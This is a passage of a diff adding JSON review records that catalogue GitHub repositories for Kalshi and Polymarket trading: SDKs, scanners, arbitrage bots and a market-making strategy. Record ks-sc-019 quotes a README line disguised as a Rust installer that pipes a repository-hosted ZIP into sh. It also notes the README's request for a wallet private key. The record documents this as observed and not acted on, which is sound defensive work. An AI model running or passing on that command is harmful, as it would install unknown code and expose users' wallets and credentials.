+   "expertise": "GitHub handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "dpeachpeach/kalshi-rust",
+  "id": "ks-sc-013",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/dpeachpeach/kalshi-rust",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "This is a wrapper for the [Kalshi](https://kalshi.com/) trading API written by and for those using Rust. \nThis wrapper is asynchronous and typically more performant than the official Python API provided by the developers",
+    "location": "README.md, opening"
+   },
+   {
+    "class": "T8",
+    "quote": "As of now the project supports interacting with Kalshi's RESTful API **fully**.",
+    "location": "README.md, 'HTTP Requests'"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening and 'Featurelist + Roadmap'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "venue-granted access tier",
+    "quote": "The Sample Bot directory is an example script that completes all the tasks required to obtain advanced API access from the developers.",
+    "location": "README.md, 'Sample Bot' — a stated account/membership-status precondition"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated. The performance claim ('typically more performant') carries no measurement."
+  },
+  "F11_attribution_status": "No trading rule stated. The comparative performance claim is unattributed and unmeasured; recorded as a gap.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "none from this record: it states an interface, not a rule"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository, additionally distributed on crates.io with rendered docs.rs documentation — a distribution channel with a published build process but no editorial review of content.",
+   "expertise": "GitHub handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "bennapp/kalshi-sdk",
+  "id": "ks-sc-014",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/bennapp/kalshi-sdk",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "Complete API for the Kalshi trading platform including all handlers for SDK generation",
+    "location": "README.md, opening line"
+   },
+   {
+    "class": "T8",
+    "quote": "This Python package is automatically generated by the [OpenAPI Generator](https://openapi-generator.tech) project:",
+    "location": "README.md, opening"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening and 'Getting Started'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi (host https://api.elections.kalshi.com/trade-api/v2)",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "key-pair authentication for authenticated calls",
+    "quote": "config.api_key_id = \"your-api-key-id\"",
+    "location": "README.md, 'Getting Started' code block"
+   },
+   {
+    "precondition": "API version pinned by the generator",
+    "quote": "- API version: 2.0.0",
+    "location": "README.md, generator block"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No trading rule stated; directive 8 not engaged.",
+  "F13_relations": {
+   "note": "The README's install line refers to the PyPI distribution 'kalshi-python', which is a separate record in this arm (ks-sc-033)."
+  },
+  "F14_to_compute": [
+   "none from this record: it states an interface, not a rule"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Machine-generated client from a published OpenAPI description; generation is deterministic and the generator and version are stated, but no editorial review of content is stated.",
+   "expertise": "GitHub handle only; the upstream API description's authorship is the venue's. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "yw666/kalshi_weather_betting",
+  "id": "ks-sc-015",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/yw666/kalshi_weather_betting",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "Real-time dashboard for Kalshi daily high-temperature prediction markets.",
+    "location": "README.md, opening line"
+   },
+   {
+    "class": "T8",
+    "quote": "**GitHub Actions** runs `fetch.py` every 15 minutes, saves results to `data.json`, and pushes to the repo",
+    "location": "README.md, 'How it works'"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; 'How it works' and 'Files'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi daily high-temperature markets",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "capture cadence",
+    "quote": "runs `fetch.py` every 15 minutes",
+    "location": "README.md, 'How it works'"
+   },
+   {
+    "precondition": "no server required for the presentation layer",
+    "quote": "**GitHub Pages** serves `index.html` which reads `data.json` directly — no server required",
+    "location": "README.md, 'How it works'"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No strategy and no outcome stated; the record is a capture-and-display tool."
+  },
+  "F11_attribution_status": "No trading rule stated; directive 8 not engaged.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "the capture cadence, if adopted (selection procedure: justified against the venue's stated rate limits and the price process's autocorrelation, not carried over as a default)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation stated.",
+   "expertise": "The record states a named author and an institutional email address, so producer identity is partly determinable. Recorded as an attribute only; not used to stratify, band, or rank."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "Archsec-Emman/Prediction-Engine",
+  "id": "ks-sc-016",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/Archsec-Emman/Prediction-Engine",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "**A single launcher that installs and runs three open-source prediction-market tools in parallel — with honest exit codes and full attribution.**",
+    "location": "README.md, opening"
+   },
+   {
+    "class": "T8",
+    "quote": "this binary contains no trading logic, no AI, and no backtesting engine of its own. It is a dependency-checking orchestrator for three upstream projects by other authors.",
+    "location": "README.md, 'What this is NOT'"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; 'What this is NOT' and 'The three engines'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "none/theoretical — the record names Polymarket via its upstreams and states no venue of its own",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "depends entirely on third-party upstreams",
+    "quote": "It is a dependency-checking orchestrator for three upstream projects by other authors.",
+    "location": "README.md, 'What this is NOT'"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "The record explicitly attributes its three components to named upstream authors and states that an earlier version's vendoring was misleading and has been removed. Attribution is carried, and the self-correction is itself the finding.",
+  "F13_relations": {
+   "note": "Names three upstream projects by other authors; the record states earlier versions vendored them under this repository's own name."
+  },
+  "F14_to_compute": [
+   "none from this record: it states an orchestrator, not a rule"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository with a CI badge; no external editorial criteria stated. The record contains an explicit self-correcting provenance statement.",
+   "expertise": "GitHub handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "talhareltal/awesome-prediction-market-analytics-tools",
+  "id": "ks-sc-017",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/talhareltal/awesome-prediction-market-analytics-tools",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "A working list of tools for trading, tracking, and researching prediction markets (Polymarket, Kalshi, and others). Each entry covers what it does, what it's best for, who's be",
+    "location": "README.md, opening section"
+   },
+   {
+    "class": "T8",
+    "quote": "Maintained by [Predictbook](https://predictbook.co): independent market-mechanics analysis for prediction markets, odds, volume, and timing, not headlines.",
+    "location": "README.md, opening section"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening section",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Polymarket, Kalshi, and others (as stated)",
+  "F8_kalshi_specific": "transferred-with-stated-assumption",
+  "F8_carrying_assumption": "The record is a curated list spanning venues; per-entry venue applicability is stated per entry and is not summarised here.",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "none stated at list level",
+    "quote": null,
+    "location": "README.md states preconditions per listed entry, not for the list as a whole"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "Each listed tool is attributed to a named producer; the list itself states no rule. Note that the list is maintained by a commercial analysis product, which is recorded in F15 as an outlet-control attribute and is NOT used to weight or rank the record.",
+  "F13_relations": {
+   "note": "A locator source: its reference list is followed as locators under section 3.2, and entries it names are candidates for future records."
+  },
+  "F14_to_compute": [
+   "none from this record"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Maintained by a named commercial product (Predictbook) that also promotes its own channels in the record. Curation criteria are stated per entry but no external editorial review is stated.",
+   "expertise": "Producer is a named commercial outlet; individual authorship is not determinable. Attribute only, not a stratifier."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "api-evangelist/kalshi",
+  "id": "ks-sc-018",
+  "F2_source_class": "S-E",
+  "F2_identifier": "github.com/api-evangelist/kalshi",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T6",
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K3",
+   "K4"
+  ],
+  "_arm_class_mismatch": "FLAGGED FOR THE LEAD SESSION. This record was returned by the S-C arm but its first-match class under section 2.1 is S-E, not S-C: its primary artifact is a third-party API profile and specification set, not executable or library code and not a package/notebook distribution. It is recorded with its first-match class per section 2.1's ordering rule rather than being forced into the arm's expected class. No criterion was reinterpreted; section 3.2 states the arm's expected yield, not a guarantee.",
+  "F4_evidence_quotes": [
+   {
+    "class": "T6",
+    "quote": "**This is not our API.** This repository is an independent, third-party profile of a company's\n> **publicly available** API surface, maintained by [API Evangelist](https://apievangelist.com).",
+    "location": "README.md, provenance block"
+   },
+   {
+    "class": "T8",
+    "quote": "the specifications it publishes for public use (OpenAPI, AsyncAPI, JSON Schema,\n> `apis.json`, `llms.txt` and similar)",
+    "location": "README.md, provenance block, 'Where the information came from'"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; the API-EVANGELIST-PROVENANCE block",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi's public API surface",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "interface capability is documented from public sources only",
+    "quote": "**Nothing here is obtained by breaching a system, defeating an access control, or\n> using credentials of any kind.**",
+    "location": "README.md, provenance block"
+   },
+   {
+    "precondition": "not the venue's own document",
+    "quote": "API Evangelist does not operate, host, resell, or support this company's APIs, and is not\n> affiliated with or endorsed by the company unless stated on the profile.",
+    "location": "README.md, provenance block"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No strategy outcome stated. The record states it computes 'Kin Score' and 'Agent Readiness' ratings of the API surface, which are not strategy outcomes."
+  },
+  "F11_attribution_status": "The record states its own sourcing explicitly and disclaims affiliation. It states no trading rule; directive 8 not engaged. Its ratings are its own and carry no external standard.",
+  "F13_relations": {
+   "note": "A derivative profile of the venue's own S-D API documentation; the venue's primary documents are S-D records for the VENUE-AND-REGULATOR arm, not this one."
+  },
+  "F14_to_compute": [
+   "none from this record"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Produced by a named third-party organisation with a stated, explicit provenance policy printed in the record itself — an unusually high degree of stated production criteria for an S-E record. Not moderated by any external body.",
+   "expertise": "Producer organisation is named and its method is stated; individual authorship is not. Attribute only, not a stratifier."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "samuel483/poly-kalshi-arb",
+  "id": "ks-sc-019",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/samuel483/poly-kalshi-arb",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T2"
+  ],
+  "F3_contribution_codes": [
+   "K1"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T2",
+    "quote": "# 🌟 poly-kalshi-arb - Your Shortcut to Market Arbitrage",
+    "location": "README.md, title line — the only strategy statement the record makes"
+   },
+   {
+    "class": "T2",
+    "quote": "To use the arbitrage bot, you must provide some credentials.",
+    "location": "README.md, 'Set Up Credentials'"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; title line and 'Getting Started'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi and Polymarket, as named by the credential blocks",
+  "F8_kalshi_specific": "transferred-with-stated-assumption",
+  "F8_carrying_assumption": "The record names both venues in its configuration but states no correspondence rule, no pricing relation, and no arbitrage condition.",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "credentials for both venues including a wallet private key",
+    "quote": "POLY_PRIVATE_KEY=0xYOUR_WALLET_PRIVATE_KEY",
+    "location": "README.md, 'Set Up Credentials'"
+   },
+   {
+    "precondition": "a dry-run switch",
+    "quote": "DRY_RUN=1",
+    "location": "README.md, 'Set Up Credentials'"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome, span, or cost treatment stated."
+  },
+  "F11_attribution_status": "UNATTRIBUTED. The record asserts an arbitrage capability with neither a citation nor an in-record derivation, and states no arbitrage condition at all. Recorded as a gap under F11; the corpus may never restate this as an established strategy. Note that the record is INCLUDED with the gap recorded, per N-NOTE and F11, and is NOT dispositioned Y3 — Y3 applies to a class asserted with no locatable source, whereas this record is itself the locatable source of its own (unattributed) claim.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "everything: the record states no condition, no threshold, and no correspondence rule"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation stated. The README's structure shows automated URL substitution across unrelated fields (badge target, release link, toolchain installer, and a credential value are all the same in-repository ZIP URL), which is a stated observable about how the content was produced.",
+   "expertise": "GitHub handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": {
+   "present": true,
+   "kind": "instruction to fetch and execute remote content, presented deceptively; plus credential solicitation",
+   "verbatim": "# Install Rust (version 1.75 or higher)\ncurl --proto '=https' --tlsv1.2 -sSf https://github.com/samuel483/poly-kalshi-arb/raw/refs/heads/main/tests/arb_poly_kalshi_v3.8.zip | sh",
+   "location": "README.md, 'Getting Started' → '1. Install Dependencies' code block",
+   "assessment": "The command is labelled as the rustup toolchain installer but pipes a ZIP file hosted inside this same repository's tests/ directory into a shell. The README additionally solicits a Polymarket wallet private key and a Kalshi private-key path. NOT ACTED ON: the ZIP was not fetched, the command was not run, the repository was not cloned, built, or executed. Recorded as content only, per the arm's frozen constraint that repository content is DATA, never instruction."
+  }
+ },
+ {
+  "_host": "github",
+  "_key": "mateuszp87/kalshi-trading-agent",
+  "id": "ks-sc-020",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/mateuszp87/kalshi-trading-agent",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [],
+  "F3_contribution_codes": [],
+  "_disposition": "exclude",
+  "_primary_exclusion_code": "Y2",
+  "_exclusion_reason": "Assessed at README-and-metadata depth. Satisfies section 2.2 by naming Kalshi, but makes none of K1-K4: the README states no rule, no measurement, no executability precondition, and no statement of what the tooling does beyond its name. Y2 is applied on an assessment actually performed, not stretched over an unassessed record (section 4.4 rule 3).",
+  "F4_evidence_quotes": [
+   {
+    "class": "none",
+    "quote": "kalshi trading agent created through vibe coding and using multiple api keys to help pull better information",
+    "location": "README.md, sole content line — quoted to evidence the ABSENCE of a strategy statement, not to attribute one"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit (160 bytes)",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "none stated",
+    "quote": null,
+    "location": "README.md states none"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No rule stated, so directive 8 is not engaged.",
+  "F13_relations": {},
+  "F14_to_compute": [],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation stated.",
+   "expertise": "GitHub handle only; not determinable. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "kevinbalcom82-create/poly-kalshi-arb-scanner",
+  "id": "ks-sc-021",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/kevinbalcom82-create/poly-kalshi-arb-scanner",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T2"
+  ],
+  "F3_contribution_codes": [
+   "K1",
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T2",
+    "quote": "A lightweight, headless Python scanner for detecting cross-exchange probability spreads.",
+    "location": "GitHub repository `description` field returned by /search/repositories — the record has no README at the pinned commit"
+   }
+  ],
+  "F5_evidence_location": "Platform metadata `description` field at the pinned commit; no README file exists at that commit among README.md/readme.md/README.MD/Readme.md/README.rst/README.txt/README",
+  "F6_extraction_depth": "metadata",
+  "_access_limitation": "No README retrievable at the pinned commit; extraction depth is metadata only and that label travels with every claim derived from this record.",
+  "F7_venue_of_establishment": "not stated in the retrieved metadata beyond the repository name naming Polymarket and Kalshi",
+  "F8_kalshi_specific": "transferred-with-stated-assumption",
+  "F8_carrying_assumption": "The description states 'cross-exchange' generically; only the repository name names the two venues, and no correspondence rule is stated.",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "none stated",
+    "quote": null,
+    "location": "Metadata states none"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "UNATTRIBUTED at the depth retrieved: no citation and no in-record derivation is visible at metadata depth. Gap recorded; the corpus may never restate this as established.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "the spread threshold at which a 'probability spread' is reported (selection procedure: derived against the two venues' stated fee and tick structures, not hand-set)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository with no README; no production criteria stated at all.",
+   "expertise": "GitHub handle only; not determinable. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "yintewang/Kalshi-Scanner",
+  "id": "ks-sc-022",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/yintewang/Kalshi-Scanner",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [],
+  "F3_contribution_codes": [],
+  "_disposition": "exclude",
+  "_primary_exclusion_code": "Y2",
+  "_exclusion_reason": "Assessed at metadata depth. The only descriptive text the platform returns is 'It scans things', which states no rule, no measurement, no precondition, and no statement of what the tooling does. Y2 is applied on an assessment actually performed. Note the depth limit: no README exists at the pinned commit, so this disposition rests on metadata alone and is labelled as such.",
+  "F4_evidence_quotes": [
+   {
+    "class": "none",
+    "quote": "It scans things",
+    "location": "GitHub repository `description` field — quoted to evidence the ABSENCE of a strategy statement"
+   }
+  ],
+  "F5_evidence_location": "Platform metadata `description` field at the pinned commit; no README at that commit",
+  "F6_extraction_depth": "metadata",
+  "_access_limitation": "No README retrievable at the pinned commit; metadata depth only.",
+  "F7_venue_of_establishment": "not stated",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "none stated",
+    "quote": null,
+    "location": "Metadata states none"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No rule stated; directive 8 not engaged.",
+  "F13_relations": {},
+  "F14_to_compute": [],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no production criteria stated.",
+   "expertise": "GitHub handle only; not determinable. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "christianluevano522-bot/Kalshi-scanner",
+  "id": "ks-sc-023",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/christianluevano522-bot/Kalshi-scanner",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [],
+  "F3_contribution_codes": [],
+  "_disposition": "reported-without-commit-identifier",
+  "_primary_exclusion_code": "Y4",
+  "_exclusion_reason": "NO COMMIT OR RELEASE IDENTIFIER OBTAINABLE. GET /repos/christianluevano522-bot/Kalshi-scanner/commits returned HTTP 409 (the platform's empty-repository response), so there is no commit to pin and no content to digest. Protocol section 3.2 states that without a commit or release identifier the record names no fixed object; this record is REPORTED AS SUCH rather than silently included. Y4 (not retrievable or not digestible) is the primary code because the retrieval chain is logged and no content exists to assess — not because any criterion on the merits was tested. Retrieval failure is not evidence of absence (section 4.3).",
+  "F4_evidence_quotes": [
+   {
+    "class": "none",
+    "quote": null,
+    "location": "No content exists at the repository; the platform returns HTTP 409 for its commit list and the `description` field is null"
+   }
+  ],
+  "F5_evidence_location": "GitHub REST v3 /repos/{owner}/{repo}/commits → HTTP 409",
+  "F6_extraction_depth": "metadata",
+  "_access_limitation": "Empty repository; HTTP 409 on the commit endpoint. No commit identifier, no README, no digestible bytes.",
+  "F7_venue_of_establishment": "not stated",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "none stated",
+    "quote": null,
+    "location": "No content"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No content."
+  },
+  "F11_attribution_status": "No content; directive 8 not engaged.",
+  "F13_relations": {},
+  "F14_to_compute": [],
+  "F15_grey_credibility": {
+   "outlet_control": "Empty repository; nothing produced.",
+   "expertise": "Not determinable. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "octavi42/prediction-market-maker",
+  "id": "ks-sc-024",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/octavi42/prediction-market-maker",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T5"
+  ],
+  "F3_contribution_codes": [
+   "K1",
+   "K2"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T5",
+    "quote": "A market-making strategy that placed #2 in Paradigm's Prediction Market Challenge",
+    "location": "README.md, header block"
+   },
+   {
+    "class": "T5",
+    "quote": "The strategy operates in two distinct regimes:",
+    "location": "README.md, 'The Strategy'"
+   },
+   {
+    "class": "T5",
+    "quote": "When the competitor's bid or ask disappears, the true price is near 0 or 1. **We become the only liquidity provider.**",
+    "location": "README.md, 'Regime 1: Monopoly (60% of total edge)'"
+   },
+   {
+    "class": "T5",
+    "quote": "**Inventory management** — how skew prevents catastrophic losses (removing it = -$7 swing)",
+    "location": "README.md, 'What You'll Learn'"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; 'Results', 'What You'll Learn', and 'The Strategy'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "A simulated hackathon venue — Paradigm's Prediction Market Challenge / Automated Research Hackathon. NOT a live exchange.",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F8_carrying_assumption": "The record states its results come from a competition simulator, not from a traded venue. It states no assumption under which the result carries to Kalshi, so 'not-transferable-as-stated' is assigned mechanically from F7 per field F8.",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "regime dependence on a competitor's quoting",
+    "quote": "When the competitor's bid or ask disappears",
+    "location": "README.md, 'Regime 1: Monopoly'"
+   },
+   {
+    "precondition": "order-flow assumption",
+    "quote": "how to match expected retail order flow",
+    "location": "README.md, 'What You'll Learn'"
+   },
+   {
+    "precondition": "quoting is conditional on volatility",
+    "quote": "**Volatility-adjusted quote filtering** — when to quote and when to sit out",
+    "location": "README.md, 'What You'll Learn'"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": true,
+   "verbatim": "| **Final Score** | $41.09 mean edge per simulation |",
+   "data_span": "110 strategy iterations over an 8-hour hackathon window; the record states the score is a mean over simulations, not over traded history",
+   "cost_treatment": "not stated",
+   "uncertainty": "No interval stated; a leaderboard of competing point scores is given",
+   "attribution": "The source states this. It is a simulator score, not a traded return, and nothing is re-derived, re-scaled, or annualized here."
+  },
+  "F11_attribution_status": "The two-regime quoting rule is derived in-record against a stated simulator and a stated iteration count. No external citation is carried for the market-making formulation. Partial attribution gap recorded.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "the quote width per regime",
+   "the inventory skew coefficient",
+   "the volatility cut-off governing 'when to quote and when to sit out' (selection procedure for all three: search with a held-out objective and a bootstrap CI, since the record states 110 iterations against a single simulator, which is an in-sample selection process)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository. Its central result was produced inside an externally administered competition with a published leaderboard — an external, stated evaluation criterion, though not editorial review. The record also documents its failures in a dedicated section.",
+   "expertise": "GitHub handle plus a competition username; partially determinable. Attribute only, not a stratifier."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "sandeepportfolio/arbiter-dashboard",
+  "id": "ks-sc-025",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/sandeepportfolio/arbiter-dashboard",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T2",
+   "T6"
+  ],
+  "F3_contribution_codes": [
+   "K1",
+   "K3"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T2",
+    "quote": "Cross-platform prediction-market arbitrage system that detects price discrepancies between Kalshi, Polymarket (US gateway), and ForecastEx (IBKR-routed), then executes paired YES/NO trades to capture the spread.",
+    "location": "README.md, opening paragraph"
+   },
+   {
+    "class": "T2",
+    "quote": "Buy YES on platform A at price `p_yes`, buy NO on platform B at price `p_no`, where `p_yes + p_no + fees < $1.00`. At settlement one side pays $1, the other pays $0, locking in a riskless `1 - p_yes - p_no - fees` profit per contract.",
+    "location": "README.md, 'System overview'"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening paragraph and 'System overview'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi, Polymarket (US gateway), and ForecastEx (IBKR-routed)",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F8_note": "Kalshi is one of the three named legs, so the record establishes on Kalshi directly as part of a stated cross-venue pairing.",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "fees enter the no-arbitrage condition explicitly",
+    "quote": "where `p_yes + p_no + fees < $1.00`",
+    "location": "README.md, 'System overview'"
+   },
+   {
+    "precondition": "stranded-leg risk is a named section of the design",
+    "quote": "6. [Stranded-leg mitigation](#stranded-leg-mitigation)",
+    "location": "README.md, table of contents — the record devotes a section to the failure mode where one leg fills and the other does not"
+   },
+   {
+    "precondition": "venue-specific instrument identifier handling",
+    "quote": "4. [ForecastEx YES/NO conid handling](#forecastex-yesno-conid-handling)",
+    "location": "README.md, table of contents"
+   },
+   {
+    "precondition": "an event-correspondence mapping layer is required",
+    "quote": "7. [Mapping system](#mapping-system)",
+    "location": "README.md, table of contents"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "Fees are carried symbolically inside the stated condition; no fee figure and no realized result are stated in the extracted region.",
+   "uncertainty": null,
+   "attribution": "The record states a condition and a system, and states no measured outcome in the extracted region. The word 'riskless' is the record's own characterisation of the condition it states, reported here as the source's word and adopted by nothing."
+  },
+  "F11_attribution_status": "The no-arbitrage condition is derived in-record (the settlement identity is written out). No external citation is carried. Partial attribution: carried by an in-record derivation, which F11 accepts as a carrier.",
+  "F13_relations": {
+   "note": "Distinct from the GitLab record ks-sc-030, which is also named 'arbiter' but is a different project on a different host with a different stated venue set. Not deduplicated: no identifier matches and no twin relation is documented by either record."
+  },
+  "F14_to_compute": [
+   "the minimum edge above the fee-inclusive threshold at which an opportunity is acted on",
+   "the event-correspondence rule and its tolerated false-match rate",
+   "the per-venue latency budget that bounds stranded-leg exposure (selection procedure for all three: empirical estimation against measured fill and latency distributions, never hand-set constants)"
+  ],
+  "F15_grey_credibility": {
